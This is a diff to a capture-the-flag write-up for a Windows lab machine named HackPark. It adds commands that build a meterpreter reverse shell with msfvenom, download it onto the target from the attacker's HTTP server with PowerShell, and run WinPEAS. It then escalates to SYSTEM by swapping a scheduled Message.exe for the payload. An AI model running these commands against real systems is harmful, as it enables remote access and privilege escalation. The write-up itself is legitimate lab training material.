@@ -71,14 +71,111 @@ Triggered the vuln. by accessing the base URL for the blog with a theme override
 -------------------------------------------------------------------------------------------
 NOW TO UPGRADE OUR WINDOWS 'SHELL WITH MSFVENOM!
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LOCALIP] LPORT=[LPORT] -f exe > reverse.exe        - CREATING THE PAYLOAD VIA MSFVENOM
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LOCALIP] LPORT=9001 -f exe > reverse.exe        - CREATING THE PAYLOAD VIA MSFVENOM
 -> Make sure LPORT is different from the port you used in the BlogEngine exploit. <-
+
+
+COPY OVER THE REVERSE.EXE TO THE WINDOWS MACHINE
+First go to a world writable location -        C:\Windows\Temp
+Start up a http server on your attacking machine -      python3 -m http.server 8000
+Then invoke the following PS command on your attacking machine - powershell -c "Invoke-WebRequest -Uri 'http://[ATTACKIP]:8000/reverse.exe' -OutFile 'C:\Windows\Temp\reverse.exe'"
+
+
+
 
 NOW TO SETUP A METERPRETER HANDLER
 
 msfconsole
 use exploit/multi/handler
-options        - set appropriate options
+options        - set appropriate options:
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ATTACKIP]
+SET LPORT 9001
+
+run                (final command)
+
+MOVE BACK OVER TO THE WINDOWS MACHINE
+
+.\reverse.exe            - run the msfvenom payload
+
+meterpreter session should be open
+------------------------------------------
+
+After we got a meterpreter session running on the Windows machine we ran the command sysinfo:
+Computer        : HACKPARK
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+
+---->
+
+The following write up will go back to normal shell to invoke Powershell easier:
+shell                -> as in the command
+
+Now we will clone WinPEAS onto our attacking machine to prepare to transfer it over:
+git clone https://github.com/carlospolop/PEASS-ng.git
+
+Now navigate to the directory folder containing WinPEAS.bat
+Start another HTTP server in this directory
+python3 -m http.server
+
+Now return to your Windows Meterpreter Shell
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.189.70:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
+
+Take a bit longer than normal to pull it from our machine
+
+.\winPEAS.bat
+
+Look for RUNNING PROCESSES in the results:            (Always good idea to do this when you get access to a Windows machine)
+If you are having issues reading the results in the dumb shell do the following:
+.\winPEAS.bat > results.txt
+And then background/terminate the 'dumb' shell and read the results in your Meterpreter shell.
+
+We find two services that should always be looked for!!!!
+WService.exe (Windows Scheduler)
+and
+WSchedulder.exe
+
+We then backgrounded the 'dumb' Shell and returned to our Meterpreter shell     (either background command or ctrl+c to do so)
+
+On our meterpreter shell we now go to:
+cd C:\"Program Files (x86)"
+cd SystemScheduler            (This directory is great for hacking processes)
+cd Events            (system logs can often be found here)
+cat 20198415519.INI.txt           (log can be very useful for finding out processes, for example ones that run every 30 seconds like in this case)
+
+We identify a process called Message.exe that runs every 30 seconds. We can exploit this.
+cd ..                - Move back to SystemScheduler dir
+mv C:/Windows/Temp/reverse.exe reverse.exe            - Move your reverse.exe msfvenom payload to this directory
+mv Message.exe Message.bak                            - Rename old Message.exe process to prepare for our exploiting
+mv reverse.exe Message.exe
+
+background            - background your Meterpreter Shell
+run                   - run your reverse_tcp exploit in msfconsole
+
+YOU SHOULD NOW BE SYSTEM
+shell            - go back to dumb shell if you want
+whoami
+echo %username%
+
+
+Now that we have Admin rights we search for the user.txt and root.txt flag
+search -f user.txt
+search -f root.txt
+
+
+To see what abnormal service is running:
+tasklist /SVC            - in dumb shell
+
+
+
+
+
+
+
 
 
 
